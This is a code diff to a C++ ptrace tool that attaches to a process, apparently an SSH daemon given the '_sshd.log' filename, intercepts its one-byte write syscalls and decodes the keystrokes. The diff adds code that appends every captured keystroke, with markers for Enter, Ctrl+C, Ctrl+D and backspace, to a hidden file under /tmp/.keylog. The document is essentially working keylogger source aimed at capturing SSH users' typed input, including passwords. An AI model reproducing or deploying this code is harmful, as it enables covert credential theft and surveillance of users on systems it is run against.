@@ -5,6 +5,11 @@
 #include <sys/ptrace.h>
 #include <wait.h>
 #include <sys/syscall.h>
+#include <boost/filesystem/path.hpp>
+
+#include "dbg.h"
+
+namespace fs = boost::filesystem;
 
 namespace ptrace_ns{
     int read_addr_into_buff(const pid_t pid, const unsigned long long addr, char *buff, unsigned int buff_size){
@@ -21,13 +26,20 @@ namespace ptrace_ns{
         return bytes_read;
     }
 
-    int ptrace_loop(const uint16_t& _pid){
+    void ptrace_loop(const uint16_t& _pid){
         int status;
         pid_t pid = _pid;
 
-        printf("[PTRACE] Starting attach pid: %d\n\n", pid);
-        if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) return 1;
-        if(waitpid(pid, &status, 0) == -1 ) return 1;
+        fs::path log_filename = "/tmp/.keylog";
+        log_filename /= std::to_string(pid) + "_sshd.log";
+        FILE *fd = std::fopen(log_filename.c_str(), "a+");
+        if(!fd){
+            std::cout << "Log-file error: " << log_filename << std::endl;
+            return;
+        }
+        std::cout << "[PTRACE] Starting attach pid: " << pid << std::endl;
+        if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) return;
+        if(waitpid(pid, &status, 0) == -1 ) return;
 
         struct user_regs_struct state{};
         ptrace(PTRACE_GETREGS, pid, 0, &state);
@@ -35,46 +47,53 @@ namespace ptrace_ns{
 
         char str[1000];
         int flag = 1;
-        while(1){
+        while(true){
             waitpid(pid, &status, 0);
             if(WIFEXITED(status)) break;
             ptrace(PTRACE_GETREGS, pid, 0, &state);
             if(state.orig_rax == SYS_write  && flag && state.rdx == 1){
-                printf("WRITE!!! \n");
                 read_addr_into_buff(pid, state.rsi, str, 1000);
                 if(str[0] == 0x20) {
-                    printf("DATA: %x \n", str[0]);
-                    printf("DATA: PROBEL \n");
-                }
-                else if(str[0] == 0x08) {
-                    printf("DATA: %x \n", str[0]);
-                    printf("DATA: BACKSPACE \n");
-                }
-                else if(str[0] == 0x07) {
-                    printf("DATA: %x \n", str[0]);
-                    printf("DATA: BELL \n");
+                    dbg(str[0]);
+                    std::string s = "[SPACE]";
+                    std::cout << "DATA: " << s << std::endl;
+                    std::fwrite(s.data(), 1, s.size(), fd);
                 }
                 else if(str[0] == 0x7F) {
-                    printf("DATA: %x \n", str[0]);
-                    printf("DATA: DELETE \n");
+                    dbg(str[0]);
+                    std::string s = "[BACKSPACE]";
+                    std::cout << "DATA: " << s << std::endl;
+                    std::fwrite(s.data(), 1, s.size(), fd);
                 }
-                else if(str[0] == 0x1B) {
-                    printf("DATA: %x \n", str[0]);
-                    printf("DATA: ESC \n");
+                else if(str[0] == 0x03) {
+                    dbg(str[0]);
+                    std::string s = "[Ctrl+C]";
+                    std::cout << "DATA: " << s << std::endl;
+                    std::fwrite(s.data(), 1, s.size(), fd);
                 }
-                else if(str[0] == 0x7F) {
-                    printf("DATA: %x \n", str[0]);
-                    printf("DATA: ENTER \n");
+                else if(str[0] == 0x04) {
+                    dbg(str[0]);
+                    std::string s = "[Ctrl+D]";
+                    std::cout << "DATA: " << s << std::endl;
+                    std::fwrite(s.data(), 1, s.size(), fd);
+                }
+                else if(str[0] == 0x0D) {
+                    dbg(str[0]);
+                    std::string s = "[ENTER]\n";
+                    std::cout << "DATA: " << s << std::endl;
+                    std::fwrite(s.data(), 1, s.size(), fd);
                 }
                 else {
-                    printf("DATA_str: %c \n", str[0]);
-                    printf("DATA_oct: %x \n", str[0]);
+                    dbg(str[0]);
+                    printf("DATA: %c \n", str[0]);
+                    std::fwrite(str, 1, 1, fd);
                 }
             }
             flag = !flag;
             ptrace(PTRACE_SYSCALL, pid, 0, 0);
         }
-        return 0;
+        std::cout << "CLOSE_PTRACING!!!!" << std::endl;
+        std::fclose(fd);
     }
 }
 
